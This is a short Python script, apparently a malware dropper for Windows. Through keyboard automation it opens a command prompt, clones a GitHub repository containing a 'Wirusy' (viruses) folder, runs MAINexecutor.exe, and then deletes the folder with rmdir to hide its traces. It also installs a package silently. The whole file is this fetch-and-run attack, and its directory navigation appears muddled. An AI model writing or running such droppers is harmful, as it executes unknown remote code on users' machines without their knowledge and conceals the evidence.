import os

libs = ["pyautogui"]
for lib in libs:
    try:
        __import__(lib)
        pass
    except ImportError:
        os.system(f"pip install {lib}")
        os.system("cls")

import pyautogui as pag
import time

# Made by MatixAndr (Python version)

pag.hotkey('win','r')
pag.typewrite("cmd")
pag.press('enter')

time.sleep(1)

pag.typewrite("mkdir QsAFSMAs123ASD")
pag.press('enter')
pag.typewrite("cd QsAFSMAs123ASD")
pag.press('enter')
pag.typewrite("git clone https://github.com/MatixAndr09/a")
pag.press('enter')
pag.typewrite("cd a")
pag.press('enter')
pag.typewrite("cd Wirusy")
pag.press('enter')
pag.typewrite("cd ..")
pag.press('enter')
pag.typewrite("cd ..")
pag.press('enter')
pag.typewrite("cd ..")
pag.press('enter')
pag.typewrite("MAINexecutor.exe")
pag.press('enter')

time.sleep(5)

pag.typewrite("rmdir /s /q QsAFSMAs123ASD")
pag.press('enter')
